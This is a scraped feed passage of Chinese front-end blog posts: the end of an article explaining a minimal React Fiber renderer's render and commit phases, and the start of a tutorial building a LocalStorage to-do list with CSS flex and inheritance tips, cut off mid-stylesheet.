<span class="hljs-deletion">- commitRoot()/commitWork(): 将计算完成的 DOM 树统一提交到真实 DOM（避免 render 阶段频繁 DOM 操作）。</span>
重要约定（fiber 结构）：
<span class="hljs-deletion">- fiber.type: 节点类型（字符串标签或 'TEXT_ELEMENT'）。</span>
<span class="hljs-deletion">- fiber.props: 属性对象（包含 children 数组）。</span>
<span class="hljs-deletion">- fiber.dom: 对应的真实 DOM 节点（在 render 阶段 createDom 后创建）。</span>
<span class="hljs-deletion">- fiber.parent: 父 fiber 引用（用于 commit 时挂载）。</span>
<span class="hljs-deletion">- fiber.child: 第一个子 fiber 链接（深度优先处理顺序）。</span>
<span class="hljs-deletion">- fiber.sibling: 兄弟 fiber 链接（以支持广度上的顺序处理）。</span>
设计说明（简要）：
<span class="hljs-deletion">- 为支持页面响应性，渲染任务被拆分为多个小的工作单元（fiber），并通过 requestIdleCallback 的空闲时间片执行。</span>
<span class="hljs-deletion">- render 阶段只负责构建 DOM 节点并建立 fiber 链表（depth-first 构建），真正的 DOM 插入在 commit 阶段一次性完成。</span>
<span class="hljs-deletion">- 目前未</span>
</code></pre>
<p>JavaScript</p>
<ol start="2">
<li>ReactDom.js 作用：创建根节点</li>
</ol>
<ul>
<li><strong>createRoot()</strong> : 创建根节点，提供渲染接口</li>
</ul>
<ol start="3">
<li>fiberUtils.js 作用</li>
</ol>
<ul>
<li><strong>commitWork()</strong> : 递归挂载 Fiber 树到真实 DOM</li>
</ul>

<pre><code class="hljs language-sql" lang="sql">功能：实现 Fiber 提交阶段的操作（<span class="hljs-keyword">commit</span>），把 render 阶段构建的 fiber 树转为真实 DOM 结构。
说明：<span class="hljs-keyword">commit</span> 阶段的核心是把已存在且正确设置 props<span class="hljs-operator">/</span>dom 的 fiber 节点插入文档中。该模块将提交逻辑单独抽离，
以便让渲染逻辑和提交逻辑职责分离，且更容易进行单元测试。
</code></pre>
<p>JavaScript</p>
<ol start="4">
<li>domUtils.js</li>
</ol>
<ul>
<li><strong>createDom()</strong> : 创建真实 DOM 节点</li>
</ul>

<ul>
<li><strong>updateProperties()</strong> : 更新 DOM 属性</li>
</ul>

<ul>
<li><strong>appendDomToRootContainer()</strong> : DOM 挂载逻辑</li>
</ul>

<pre><code class="hljs language-diff" lang="diff">功能概览：
<span class="hljs-deletion">- 本文件包含与真实 DOM 操作相关的纯工具函数，负责在 render/commit 阶段处理 DOM 的创建、属性更新与父容器挂载逻辑。</span>
<span class="hljs-deletion">- 把这些与副作用相关的细节抽象到独立模块，能使主渲染逻辑更简洁且更容易测试。</span>
约束与说明：
<span class="hljs-deletion">- 这些函数会直接操作浏览器 DOM，因此它们的副作用应只在 commit 阶段执行。</span>
<span class="hljs-deletion">- updateProperties 非常基础：仅直接把 props 的字段（非 children）赋值到元素上，未做差分、事件绑定处理或样式合并（这些为后续功能）。</span>
</code></pre>
<p>JavaScript</p>
<ol start="5">
<li>childrenUtils.js</li>
</ol>
<ul>
<li><strong>normalizeChildren()</strong> : 规范化 children 数组</li>
</ul>

<ul>
<li>处理各种输入类型（undefined、单值、数组）</li>
</ul>

<ul>
<li>扁平化嵌套数组</li>
</ul>

<ul>
<li>将文本节点转换为 TEXT_ELEMENT 结构</li>
</ul>

<pre><code class="hljs language-typescript" lang="typescript">功能：规范化 children 列表，返回一个扁平化且统一结构的 children 数组（便于后续构建 fiber）
这个工具做了下列工作：
<span class="hljs-number">1</span>) 接受各种可能的 children 输入形态：
   - <span class="hljs-literal">undefined</span> / <span class="hljs-literal">null</span>
   - 单个节点对象（<span class="hljs-title class_">VNode</span>）
   - 单个原始值（<span class="hljs-built_in">string</span> / <span class="hljs-built_in">number</span>）
   - 数组（可能嵌套）
<span class="hljs-number">2</span>) 将 children 规范成一个扁平数组，移除 <span class="hljs-literal">null</span>/<span class="hljs-literal">undefined</span>
<span class="hljs-number">3</span>) 将原始文本（<span class="hljs-built_in">string</span> / <span class="hljs-built_in">number</span>）转换为一个统一的 <span class="hljs-variable constant_">TEXT_ELEMENT</span> 虚拟节点，
   以便后续的 createDom / props 处理一致
返回值：一个标准化的 children 数组（所有项都为 <span class="hljs-title class_">VNode</span> 样式对象，或整体为空数组）
设计注意点：
- 此处没有深度拷贝 children 对象，因此传入的对象引用会保留。
- 对于非常深/大的 children 数组，<span class="hljs-title function_">flat</span>(<span class="hljs-title class_">Infinity</span>) 可能引发性能问题，生产代码中应使用更高效的迭代器或限制层级。
</code></pre>
<p>JavaScript</p>
<h3 data-id="heading-0">整体渲染流程</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13abf7b537fd4e96b125f0433b927f66~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSG9saW5f5rWp6ZyW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764434828&amp;x-signature=CNm4qsiK8xN59GOg6Kh7ZB%2BPdW4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-1">performUnitOfWork 详细流程</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7340e0c8a65c42b2a6dd1247318ad2a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSG9saW5f5rWp6ZyW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764434828&amp;x-signature=KIP70%2FXAWzqhW3JuOZR6MVQklig%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">commitWork 提交流程</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f8de6f7e4e8495394a12eac66fbe655~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSG9saW5f5rWp6ZyW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764434828&amp;x-signature=wAuGacAzcZZZ3oAHyIeSYDzM%2Fro%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">children规范化流程</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f34ddf26b1f4e22abbbcf76342a30f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSG9saW5f5rWp6ZyW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764434828&amp;x-signature=FFEVsapS0i27Eh3N0%2B1AJu0Bzkg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">详细执行流程</h2>
<h3 data-id="heading-5">阶段一：初始化阶段</h3>
<ol>
<li><strong>应用启动</strong></li>
</ol>
<ul>
<li>main.jsx 调用 ReactDom.createRoot(document.getElementById('root'))</li>
</ul>

<ul>
<li>创建根容器，返回包含 render 方法的对象</li>
</ul>
<ol start="2">
<li><strong>开始渲染</strong></li>
</ol>
<ul>
<li>调用 root.render(App)</li>
</ul>

<ul>
<li>触发 React.render(node, container)</li>
</ul>
<ol start="3">
<li><strong>设置根 Fiber</strong></li>
</ol>
<ul>
<li>创建根 Fiber 对象，设置 dom 为容器节点</li>
</ul>

<ul>
<li>props.children 包含要渲染的 App 组件</li>
</ul>

<ul>
<li>设置 nextWorkOfUnit 为根 Fiber</li>
</ul>

<ul>
<li>保存 root 引用用于后续提交</li>
</ul>
<h3 data-id="heading-6">阶段二：调度器启动</h3>
<ol>
<li><strong>工作循环初始化</strong></li>
</ol>
<ul>
<li>window.requestIdleCallback(workLoop) 启动调度</li>
</ul>

<ul>
<li>workLoop 检查浏览器空闲时间</li>
</ul>
<ol start="2">
<li><strong>时间切片处理</strong></li>
</ol>
<ul>
<li>在 deadline.timeRemaining() &gt; 1ms 时持续处理</li>
</ul>

<ul>
<li>每次循环调用 performUnitOfWork(nextWorkOfUnit)</li>
</ul>

<ul>
<li>处理完成后更新 nextWorkOfUnit 为返回的下一个 Fiber</li>
</ul>
<h3 data-id="heading-7">阶段三：Render 阶段（Fiber 树构建）</h3>
<h4 data-id="heading-8">3.1 处理单个 Fiber 单元</h4>
<ol>
<li><strong>Fiber 类型判断</strong></li>
</ol>
<ul>
<li>检查是否为函数组件（typeof fiber.type === 'function'）</li>
</ul>

<ul>
<li>函数组件：执行函数获取返回的 VNode，更新 fiber.props.children</li>
</ul>

<ul>
<li>普通组件：创建 DOM 节点并设置属性</li>
</ul>
<ol start="2">
<li><strong>DOM 节点创建</strong></li>
</ol>
<ul>
<li>调用 createDom(fiber) 创建对应节点</li>
</ul>

<ul>
<li>TEXT_ELEMENT 创建 TextNode，其他创建 Element</li>
</ul>

<ul>
<li>调用 updateProperties 设置 DOM 属性</li>
</ul>
<ol start="3">
<li><strong>子节点规范化</strong></li>
</ol>
<ul>
<li>调用 normalizeChildren(fiber.props.children)</li>
</ul>

<ul>
<li>处理各种 children 输入情况</li>
</ul>

<ul>
<li>扁平化数组，转换文本节点为 TEXT_ELEMENT</li>
</ul>

<ul>
<li>过滤 null/undefined 节点</li>
</ul>
<ol start="4">
<li><strong>构建子 Fiber 链表</strong></li>
</ol>
<ul>
<li>遍历规范化后的 children 数组</li>
</ul>

<ul>
<li>为每个子节点创建对应的 Fiber</li>
</ul>
<ol start="5">
<li/>
</ol>
<ul>
<li>建立 parent-child-sibling 链接关系</li>
</ul>

<ul>
<li>第一个子节点：fiber.child = newFiber</li>
</ul>

<ul>
<li>后续子节点：prevSibling.sibling = newFiber</li>
</ul>
<h4 data-id="heading-9">3.2 深度优先遍历</h4>
<ol>
<li><strong>返回下一个工作单元</strong></li>
</ol>
<ul>
<li>优先返回子节点：if (fiber.child) return fiber.child</li>
</ul>

<ul>
<li>其次返回兄弟节点：if (fiber.sibling) return fiber.sibling</li>
</ul>

<ul>
<li>向上回溯查找父级的兄弟节点</li>
</ul>

<ul>
<li>遍历完成返回 null</li>
</ul>
<h3 data-id="heading-10">阶段四：Commit 阶段（DOM 挂载）</h3>
<h4 data-id="heading-11">4.1 提交准备</h4>
<ul>
<li>当 nextWorkOfUnit 为 null 且 root 存在时</li>
</ul>

<ul>
<li>调用 commitRoot() 进入提交阶段</li>
</ul>
<h4 data-id="heading-12">4.2 递归挂载 DOM</h4>
<ol>
<li><strong>commitWork 执行</strong></li>
</ol>
<ul>
<li>检查当前 Fiber 是否有 DOM 节点</li>
</ul>

<ul>
<li>查找最近的有 DOM 的父节点（跳过函数组件）</li>
</ul>

<ul>
<li>执行 parentFiber.dom.appendChild(fiber.dom)</li>
</ul>
<ol start="2">
<li><strong>深度优先挂载</strong></li>
</ol>
<ul>
<li>先递归挂载子节点：commitWork(fiber.child)</li>
</ul>

<ul>
<li>再递归挂载兄弟节点：commitWork(fiber.sibling)</li>
</ul>
<h4 data-id="heading-13">4.3 完成渲染</h4>
<ul>
<li>所有 DOM 节点挂载完成</li>
</ul>

<ul>
<li>清空 root 引用</li>
</ul>

<ul>
<li>渲染流程结束</li>
</ul>
<h2 data-id="heading-14">四、关键数据结构</h2>
<h3 data-id="heading-15">Fiber 节点结构：</h3>
<p>javascript</p>
<pre><code class="hljs language-yaml" lang="yaml">{
  <span class="hljs-attr">type:</span> <span class="hljs-string">'div'</span> <span class="hljs-string">|</span> <span class="hljs-string">'TEXT_ELEMENT'</span> <span class="hljs-string">|</span> <span class="hljs-string">Function</span>,
  <span class="hljs-attr">props:</span> { <span class="hljs-attr">children:</span> [], <span class="hljs-string">...attributes</span> },
  <span class="hljs-attr">dom:</span> <span class="hljs-string">HTMLElement</span> <span class="hljs-string">|</span> <span class="hljs-string">Text</span>,
  <span class="hljs-attr">parent:</span> <span class="hljs-string">Fiber</span>,
  <span class="hljs-attr">child:</span> <span class="hljs-string">Fiber</span>,
  <span class="hljs-attr">sibling:</span> <span class="hljs-string">Fiber</span>
}
</code></pre>
<p>Plain Text</p>
<h3 data-id="heading-16">虚拟 DOM 结构：</h3>
<p>javascript</p>
<pre><code class="hljs language-css" lang="css">// 元素节点
{ type: <span class="hljs-string">'div'</span>, props: { id: <span class="hljs-string">'app'</span>, children: [...] } }


// 文本节点  
{ type: <span class="hljs-string">'TEXT_ELEMENT'</span>, props: { nodeValue: <span class="hljs-string">'text'</span>, children: [] } }
</code></pre>
<p>Plain Text</p>
<h2 data-id="heading-17">五、总结</h2>
<h3 data-id="heading-18">1. 时间切片调度</h3>
<ul>
<li>使用 requestIdleCallback 避免阻塞主线程</li>
</ul>

<ul>
<li>将渲染任务拆分为多个工作单元</li>
</ul>

<ul>
<li>在浏览器空闲时段执行</li>
</ul>
<h3 data-id="heading-19">2. 阶段分离设计</h3>
<ul>
<li><strong>Render 阶段</strong>：纯计算，构建 Fiber 树，不操作 DOM</li>
</ul>

<ul>
<li><strong>Commit 阶段</strong>：批量 DOM 操作，避免频繁重排重绘</li>
</ul>
<h3 data-id="heading-20">3. 链表数据结构</h3>
<ul>
<li>使用 child、sibling 指针构建树形结构</li>
</ul>

<ul>
<li>支持高效的深度优先遍历</li>
</ul>

<ul>
<li>便于暂停和恢复渲染任务</li>
</ul>
<h3 data-id="heading-21">4. 统一节点处理</h3>
<ul>
<li>所有节点（包括文本）都转换为统一结构</li>
</ul>

<ul>
<li>简化后续处理逻辑</li>
</ul>

<ul>
<li>支持函数组件和普通组件</li>
</ul>
<h3 data-id="heading-22">5. 模块化设计</h3>
<ul>
<li>每个模块职责单一明确</li>
</ul>

<ul>
<li>工具函数独立，便于测试和维护</li>
</ul>

<ul>
<li>清晰的依赖关系和数据流向</li>
</ul>
<h2 data-id="heading-23">六、扩展性考虑</h2>
<p>当前架构为后续功能扩展提供了良好基础，后续需要做这些：</p>
<ul>
<li><strong>Diff 算法</strong>：可在 performUnitOfWork 中实现节点比较</li>
</ul>

<ul>
<li><strong>事件系统</strong>：在 updateProperties 中添加事件处理</li>
</ul>

<ul>
<li><strong>Hooks 支持</strong>：在函数组件处理时维护状态</li>
</ul>

<ul>
<li><strong>错误边界</strong>：添加异常捕获和处理机制React Fiber 渲染器核心逻辑详解</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 0 到 1 实现 LocalStorage 待办清单：CSS 进阶 + 前端工程化思想实践]]></title>    <link>https://juejin.cn/post/7575133880435687475</link>    <guid>https://juejin.cn/post/7575133880435687475</guid>    <pubDate>2025-11-23T02:21:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575133880435687475" data-draft-id="7575083657993732123" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 0 到 1 实现 LocalStorage 待办清单：CSS 进阶 + 前端工程化思想实践"/> <meta itemprop="keywords" content="CSS,前端工程化"/> <meta itemprop="datePublished" content="2025-11-23T02:21:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="生椰丝绒拿铁"/> <meta itemprop="url" content="https://juejin.cn/user/4185180725584116"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 0 到 1 实现 LocalStorage 待办清单：CSS 进阶 + 前端工程化思想实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4185180725584116/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    生椰丝绒拿铁
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T02:21:10.000Z" title="Sun Nov 23 2025 02:21:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在前端开发中，LocalStorage 是浏览器提供的核心本地存储方案，而 CSS 布局与工程化编码则是提升开发效率和代码质量的关键。本文将结合实际案例，带大家从零实现一个可持久化的待办清单，同时拆解 CSS 继承 / 弹性布局的核心用法，以及前端函数式封装的工程化思想。</p>
<h2 data-id="heading-0">一、核心知识点预热：先搞懂这 3 个关键技术</h2>
<p>在动手写代码前，我们先梳理案例中涉及的核心技术点，帮大家打通知识盲区：</p>
<h3 data-id="heading-1">1. LocalStorage：浏览器的「永久储物柜」</h3>
<ul>
<li>
<p><strong>存储位置</strong>：浏览器本地，与服务器无关</p>
</li>
<li>
<p><strong>存储特性</strong>：永久存储（除非手动清除或代码删除），页面刷新 / 关闭后数据不丢失</p>
</li>
<li>
<p><strong>存储规则</strong>：仅支持 <code>key-value</code> 键值对，且值必须是字符串（对象 / 数组需用 <code>JSON.stringify()</code> 序列化）</p>
</li>
<li>
<p><strong>核心 API</strong>：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 存数据</span>
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'key'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(数据));
<span class="hljs-comment">// 取数据（需反序列化）</span>
<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'key'</span>));
<span class="hljs-comment">// 删数据（单个/全部）</span>
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'key'</span>);
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">clear</span>();
</code></pre>
</li>
</ul>
<h3 data-id="heading-2">2. CSS 关键特性：这些细节能少写 80% 冗余代码</h3>
<h4 data-id="heading-3">（1）继承性：不是所有属性都能「子承父业」</h4>
<ul>
<li>
<p><strong>可继承属性</strong>：<code>font-size</code>、<code>color</code>、<code>text-align</code> 等文本相关属性（子元素自动继承父元素样式）</p>
</li>
<li>
<p><strong>不可继承属性</strong>：<code>background</code>、<code>width</code>、<code>height</code>、<code>border</code> 等布局 / 盒模型相关属性（需手动设置）</p>
</li>
<li>
<p><strong>实用技巧</strong>：用 <code>inherit</code> 强制继承父属性，比如让子元素高度跟随父元素：</p>
<p>css</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.child</span> {
  <span class="hljs-attribute">height</span>: inherit; <span class="hljs-comment">/* 继承父元素 height */</span>
}
</code></pre>
</li>
</ul>
<h4 data-id="heading-4">（2）outline 与 overflow：细节优化神器</h4>
<ul>
<li><strong>outline</strong>：元素轮廓，类似 <code>border</code> 但不占据盒模型空间（适合表单聚焦样式）</li>
<li><strong>overflow</strong>：控制子元素超出父元素时的表现（<code>hidden</code> 隐藏溢出、<code>auto</code> 自动滚动）</li>
</ul>
<h4 data-id="heading-5">（3）Flex 布局：快速实现居中与对齐</h4>
<p>Flex 是现代布局方案，核心是「格式化上下文」，只需 3 行代码实现元素居中：</p>
<p>css</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.parent</span> {
  <span class="hljs-attribute">display</span>: flex; <span class="hljs-comment">/* 开启 Flex 布局 */</span>
  <span class="hljs-attribute">justify-content</span>: center; <span class="hljs-comment">/* 主轴（水平）居中 */</span>
  <span class="hljs-attribute">align-items</span>: center; <span class="hljs-comment">/* 交叉轴（垂直）居中 */</span>
}
</code></pre>
<h3 data-id="heading-6">3. 前端工程化：拒绝流程式代码，拥抱函数封装</h3>
<p>当代码超过 10 行，就该考虑封装函数！核心优势：</p>
<ul>
<li>复用性：同一逻辑多处调用，减少冗余</li>
<li>可维护性：隐藏实现细节，修改时只需改函数内部</li>
<li>可读性：函数名即功能，代码逻辑更清晰</li>
</ul>
<h2 data-id="heading-7">二、实战：实现 LocalStorage 待办清单</h2>
<h3 data-id="heading-8">1. 项目结构</h3>
<p>plaintext</p>
<pre><code class="hljs language-bash" lang="bash">todo-list/
├── common.css  <span class="hljs-comment"># 样式文件</span>
└── index.html  <span class="hljs-comment"># 结构+逻辑文件</span>
</code></pre>
<h3 data-id="heading-9">2. 样式文件：common.css</h3>
<p>css</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 基础重置：统一盒模型 */</span>
<span class="hljs-selector-tag">html</span> {
  <span class="hljs-attribute">box-sizing</span>: border-box;
  <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>; <span class="hljs-comment">/* 占满视口高度 */</span>
  <span class="hljs-attribute">display</span>: flex; <span class="hljs-comment">/* 页面整体居中 */</span>
  <span class="hljs-attribute">justify-content</span>: center;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">text-align</span>: center; <span class="hljs-comment">/* 文本居中 */</span>
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f5f5f5</span>;
}

*,
*<span class="hljs-selector-pseudo">::before</span>,
*<span class="hljs-selector-pseudo">::after</span> {
  <span class="hljs-attribute">box-sizing</span>: inherit; <span class="hljs-comment">/* 继承盒模型 */</span>
}

<span class="hljs-comment">/* 容器样式 */</span>
<span class="hljs-selector-class">.wrapper</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">max-width</span>: <span class="hljs-number">350px</span>;
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.95</span>);
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">10px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>); <span class="hljs-comment">/* 外发光效果 */</span>
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
}

<span class="hljs-selector-tag">h2</span> {
  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">200</span>;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
}

<span class="hljs-comment">/* 待办列表样式 */</span>
<span class="hljs-selector-class">.plates</span> {
  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">text-align</span>: left;
  <span class="hljs-attribute">list-style</span>: none;
}

<span class="hljs-selector-class">.plates</span> <span class="hljs-selector-tag">li</span> {
  <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span> <span class="hljs-number">0</span>;
  <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">100</span>;
  <span class="hljs-attribute">display</span>: flex; <span class="hljs-comment">/* 复选框与文本同行 */</span>
  <span class="hljs-attribute">align-items</span>: center;
}

<span class="hljs-selector-class">.plates</span> <span class="hljs-selector-tag">label</span> {
  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>; <span class="hljs-comment">/* 文本占满剩余空间 */</span>
  <span class="hljs-attribute">cursor</span>: pointer; <span class="hljs-comment">/* 鼠标悬浮变指针 */</span>
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#444</span>;
}

<span class="hljs-comment">/* 自定义复选框样式 */</span>
<span class="hljs-selector-class">.plates</span> <span class="hljs-selector-tag">input</span> {
  <span class="hljs-attribute">display</span>: none; <span class="hljs-comment">/* 隐藏原生复选框 */</span>
}

<span class="hljs-selector-class">.plates</span> <span class="hljs-selector-tag">input</span> + <span class="hljs-selector-tag">label</span><span class="hljs-selector-pseudo">:before</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-string">"⬜️"</span>;
